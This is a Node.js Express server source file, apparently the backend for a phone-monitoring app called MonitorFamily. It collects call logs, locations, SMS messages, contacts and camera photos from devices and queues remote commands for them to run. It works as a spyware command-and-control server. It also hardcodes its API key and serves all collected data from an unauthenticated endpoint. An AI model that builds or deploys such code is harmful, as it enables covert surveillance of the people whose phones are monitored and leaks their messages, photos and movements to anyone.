const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = 'monitor-family-secret-7860';
const DATA_FILE = path.join(__dirname, 'devices.json');
const COMMANDS_FILE = path.join(__dirname, 'commands.json');

app.use(express.json({ limit: '50mb' }));
app.use(cors());

// Helper Functions
function getDevices() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } catch (e) {
            return {};
        }
    }
    return {};
}

function saveDevices(devices) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
}

function getCommands() {
    if (fs.existsSync(COMMANDS_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(COMMANDS_FILE, 'utf8'));
        } catch (e) {
            return {};
        }
    }
    return {};
}

function saveCommands(commands) {
    fs.writeFileSync(COMMANDS_FILE, JSON.stringify(commands, null, 2));
}

// 1. Regular Sync (Battery, Location, Calls)
app.post('/api/sync', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, deviceName, callLogs, location, battery, syncedAt } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

    const devices = getDevices();
    if (!devices[deviceId]) {
        devices[deviceId] = { name: deviceName, callLogs: [], locations: [], battery: {}, lastSync: null };
    }

    if (callLogs && callLogs.length > 0) devices[deviceId].callLogs = [...devices[deviceId].callLogs, ...callLogs];
    if (location) devices[deviceId].locations.push({ ...location, syncedAt });
    if (battery) devices[deviceId].battery = battery;
    
    devices[deviceId].lastSync = syncedAt || Date.now();
    saveDevices(devices);
    res.json({ success: true });
});

// 2. Camera Photo
app.post('/api/camera', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, photoBase64, timestamp, isFront } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        if (!devices[deviceId].photos) devices[deviceId].photos = [];
        devices[deviceId].photos.push({ photo: photoBase64, timestamp: timestamp || Date.now(), isFront });
        saveDevices(devices);
        console.log(`Photo received from ${deviceId}`);
    }
    res.json({ success: true });
});

// 3. SMS Receive
app.post('/api/sms', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, sms } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        devices[deviceId].sms = sms;
        devices[deviceId].smsSyncedAt = Date.now();
        saveDevices(devices);
        console.log(`SMS received from ${deviceId}: ${sms ? sms.length : 0} messages`);
    }
    res.json({ success: true });
});

// 4. Contacts Receive
app.post('/api/contacts', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, contacts } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        devices[deviceId].contacts = contacts;
        devices[deviceId].contactsSyncedAt = Date.now();
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 5. Get All Devices
app.get('/api/devices', (req, res) => {
    res.json(getDevices());
});

// 6. Send Command to Device
app.post('/api/command', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, command, params } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });

    const commands = getCommands();
    if (!commands[deviceId]) commands[deviceId] = [];
    
    commands[deviceId].push({
        command,
        params,
        timestamp: Date.now(),
        executed: false
    });
    
    saveCommands(commands);
    console.log(`Command sent to ${deviceId}: ${command}`);
    res.json({ success: true, message: 'Command queued' });
});

// 7. Device Fetch Commands
app.get('/api/commands/:deviceId', (req, res) => {
    const commands = getCommands();
    const deviceCommands = commands[req.params.deviceId] || [];
    const pendingCommands = deviceCommands.filter(cmd => !cmd.executed);
    res.json({ commands: pendingCommands });
});

// 8. Mark Command Executed
app.post('/api/command/execute/:deviceId', (req, res) => {
    const { command, result } = req.body;
    const commands = getCommands();
    const deviceCommands = commands[req.params.deviceId] || [];
    
    const cmdIndex = deviceCommands.findIndex(c => c.command === command && !c.executed);
    if (cmdIndex !== -1) {
        deviceCommands[cmdIndex].executed = true;
        deviceCommands[cmdIndex].result = result;
        deviceCommands[cmdIndex].executedAt = Date.now();
        saveCommands(commands);
    }
    
    res.json({ success: true });
});

app.get('/', (req, res) => {
    res.send('MonitorFamily Backend is Running!');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
